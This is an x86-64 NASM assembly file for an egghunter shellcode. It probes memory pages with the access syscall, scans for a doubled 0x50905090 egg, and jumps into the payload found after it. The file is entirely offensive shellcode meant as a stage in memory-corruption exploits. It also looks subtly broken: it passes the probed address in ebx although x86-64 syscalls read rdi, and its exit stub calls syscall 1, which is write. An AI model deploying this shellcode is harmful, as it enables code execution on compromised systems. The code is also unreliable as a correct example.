; David @InfinitelyManic
; code derived from http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf 
; nasm -felf64 -g -F dwarf egghunter.s -o egghunter.o && ld egghunter.o -o egghunter
section .text
	global _start
_start:
	xor edx, edx
L0:
	or dx, 0xfff			; prep 4096 PAGE_SIZE boundary - no nulls
L1:
	inc edx				; 0x...1000 = 4096 PAGE_SIZE, 0x1000++
	
	lea ebx, [edx+0x4]		; access address 
	push byte 21			; 0x21 for 32-bit; don't get it confused 
	pop rax				; access syscall 
	syscall 

	cmp al, 0xf2			; is error EFAULT?
	jz L0

	mov eax, 0x50905090		; egg - NOP slide
	mov edi, edx			; scas base
	scasd				; search for egg then inc 4 bytes
	jnz L1				; if egg not found then inc addr
	scasd 				; search for egg then inc 4 bytes
	jnz L1				; if egg not found then inc addr
	jmp rdi				; egg found, 8 bytes are skipped, execute shellcode
	
_exit:					; exit not required since we intend to find egg 
	xor eax, eax
	add al, 1
	syscall 
